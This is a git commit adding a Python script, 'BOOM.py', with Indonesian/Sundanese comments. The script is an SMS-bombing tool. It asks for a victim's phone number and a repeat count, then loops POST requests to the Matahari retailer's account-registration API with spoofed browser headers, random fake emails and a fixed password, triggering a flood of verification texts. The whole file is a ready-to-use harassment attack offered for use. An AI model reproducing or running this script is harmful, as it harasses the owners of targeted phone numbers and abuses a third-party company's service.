4471ef8d5ccb95e10ee815b1e2353e7fb3291a51
FazryS <104543273+FazryS@users.noreply.github.com>
2022-04-28 09:48:08 +0700

    Add files via upload

---
+++ BOOM.py
@@ -0,0 +1,126 @@
+# YAHAHAHAH MAU RECODE YA!!!!
+# ANZAY RECODE!!!
+# UPDATE TERBARU 2022
+# SOK RECODE WEH HENTEU MAYAR IEUH
+# TONG DI UBAH NU AYA  TULISAN TONF DI UBAH KENA ERORR
+# MUN MERUGUL NYA TERSERAH ERROR TONG NYALAHKEUN ANJINK!
+try:    # Tong di ubah
+        import time,sys,os,json,requests,random
+except ModuleNotFoundError:
+         print ('[!] Install Modul Requests')
+         os.system('pip install requests')
+
+try:    # Tong di ubah
+        ip = requests.get('https://api.ipify.org').text
+except requests.exceptions.ConnectionError:
+        exit(' [!] Koneksi Internet Error')
+def mengetik(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.02)
+# Tong di ubah
+Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
+# Tong di ubah
+Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])
+
+a,m,h,k,b,u,c,p,bn,o = [
+'\033[90m',
+'\033[31m',
+'\033[32m',
+'\033[33m',
+'\033[94m',
+'\033[35m',
+'\033[36m',
+'\033[37m',
+'\033[41m',
+'\033[0m'
+]
+os.system("clear")
+d = input("hayang lanjut spam? (Y/n): ")
+time.sleep(3)
+print('')
+mengetik('SAVE DULU WA GW ^-^')
+time.sleep(2)
+# SAVE BUTKON  ⬇ ⬇ ⬇
+os.system('wa.me/6283109115523')
+time.sleep(2)
+# MUN NU DI HANDAP IEU KUSIA UBAH NGARAN NA DOANG ⬇ ⬇ ⬇ ⬇
+banner = """
+\033[94m╔═══════════╗
+\033[94m║           ║
+\033[94m╚═══╗   ╔═══╝
+\033[94m    ║   ║  ╔══════╗ ╔═════╗
+\033[94m    ║   ║  ║      ║ ║     ║ ╔════╗ ╔══╗ ╔══╗
+\033[94m    ║   ║  ║══════╝ ║═════╝ ║    ║ ║  ║ ║  ║
+\033[94m    ║   ║  ║        ║═════╗ ║    ║ ║  ╚═╝  ║
+\033[94m    ║   ║  ║      ║ ║     ║ ║    ║ ║       ║ ╔╗
+\033[94m    ║   ║  ╚══════╝ ╚═════╝ ╚════╝ ╚       ╝ ╚╝ (Versih V2.6.1)
+\033[94m    ╚═══╝
+\033[32m( \033[37mSpam Sms \033[33mMatahari \033[32m| \033[37mBY \033[33mFAZRY S \033[32m) \033[32m(\033[37mV.2\033[32m)
+
+             \033[37m[\033[32m1\033[37m] \033[37mCreator \033[31m: \033[33mFAZRY S
+             \033[37m[\033[32m2\033[37m] \033[33mGithub  \033[31m: \033[37mhttps://github.com/fazrysablenk             
+             \033[37m[\033[32m3\033[37m] \033[32mFacebook\033[31m: \033[33mFazry
+\033[35m⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤⏤"""
+os.system('clear')
+# UBAH TERSERAH SIA :)
+mengetik('\033[1;96m╔══════════════════════════════════════════════════╗')
+mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Creator\033[1;93m: \033[1;92mKz.tutorial")
+mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Github\033[1;93m : \033[1;92mgithub.com/Kz.tutorial.git")
+mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Status\033[1;93m : \033[1;92mSelalu Online")
+mengetik("\033[1;95m [\033[1;90m•\033[1;95m]\033[1;96m Version\033[1;93m: \033[1;92mv2.6.1")
+mengetik('\033[1;96m═══════════════════════════════════════════════════')
+
+# TONG DI UBAH
+print (banner)
+print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
+print ('\033[37m[\033[33m•\033[37m]\033[33m :\033[33m \033[32mMax 10\033[32m ')
+no = input('\n\033[37m[\033[33m•\033[37m] \033[33mex \033[31m: \033[32m08xx\n\033[37m[\033[32m+\033[37m] \033[33mPhone\033[31m:\033[32m ')
+if no =='':
+   exit('\033[37m[\033[31m!\033[37m] ntong Kosong sayang😘')
+elif len(no) <= 9:
+   exit('\033[37m[\033[31m!\033[37m] Nomor Henteu Baleg ')
+else:
+   jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[33mJumlah\033[31m:\033[32m '))
+
+# Tong di ubah
+heder = {'Host': 'www.matahari.com',
+           'content-length': '240',
+           'origin': 'https://www.matahari.com',
+           'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
+           'content-type': 'application/json',
+           'accept': '*/*',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
+           'save-data': 'on',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-mode': 'cors',
+           'sec-fetch-dest': 'empty',
+           'referer': 'https://www.matahari.com/customer/account/create/',
+           'accept-encoding': 'gzip, deflate, br',
+           'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
+
+# Tong di ubah
+data = {
+	"thor_customer": {
+		"name": Name,
+		"email_address": Email,
+		"mobile_country_code": "+62",
+		"gender_id": "1",
+		"mobile_number": no,
+		"mro": "",
+		"password": "Wadepak1037",
+		"birth_date": "04/02/2022"
+		}
+	}
+
+print("\n\033[37m[\033[31m!\033[37m] \033[32mMessage ..\n")
+for i in range(jml):
+      # Tong di ubah
+      sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
+      if 'Success' in sec.text:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[32mSpam Sms Terkirim')
+      else:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[33mMessage \033[31m: \033[31mSpam Sms Gagal')
+      time.sleep(1.5)
+print ('\n\033[37m[\033[32m√\033[37m] \033[37mSpam Anggeus! \033[33m:)')
